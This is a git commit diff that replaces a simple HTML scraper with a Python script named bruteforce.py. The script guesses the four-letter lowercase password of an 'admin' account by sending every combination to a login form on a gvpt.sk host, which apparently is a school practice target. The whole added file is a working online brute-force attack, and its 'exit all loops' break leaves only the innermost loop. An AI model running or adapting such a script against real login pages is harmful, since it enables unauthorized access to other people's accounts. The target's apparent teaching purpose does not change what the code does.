03febb78e050d1033d85877b87d75c78e1a1bf15
ReadinGravity <113469951+ReadinGravity@users.noreply.github.com>
2024-01-15 12:56:53 +0100

    Update bruteforce.py

--- bruteforce.py
+++ bruteforce.py
@@ -1,14 +1,31 @@
+from string import ascii_lowercase
 import requests
-r = requests.get("https://gvpt.sk/sk/", auth=("user", "pass"))
-fw= open ("bordel.txt", "w", encoding="UTF-8")
-page=r.text
-zob=True
-for i in page:
-    if i =="<":
-        zob=False
-    elif i ==">":
-        zob=True
-    elif zob:
-        if not i=="/n":
-            fw.write()
 
+name = "admin"
+password = ['', '', '', '']
+# heslo: 4 pismena mini abeceda
+r = requests.post("https://dudo.gvpt.sk/bruteforce/account/login", data={name: ''.join(password)})
+check = r.text
+correct = []
+count = 0
+for i in ascii_lowercase:
+    password[0] = i
+    for j in ascii_lowercase:
+        password[1] = j
+        for x in ascii_lowercase:
+            password[2] = x
+            for y in ascii_lowercase:
+                password[3] = y
+                data = {'username': name, 'password': ''.join(password), "action": "submit"}
+                temp = requests.post("https://dudo.gvpt.sk/bruteforce/account/login", data=data)
+                if b"fail" in temp.content:
+                    print("pokus:", ''.join(password))
+                else:
+                    print(''.join(password))
+                    correct.append(''.join(password))
+                    break  # exit all loops when password is found
+                count += 1
+                print(count)
+print("Finished")
+print(correct)
+#pass xamp
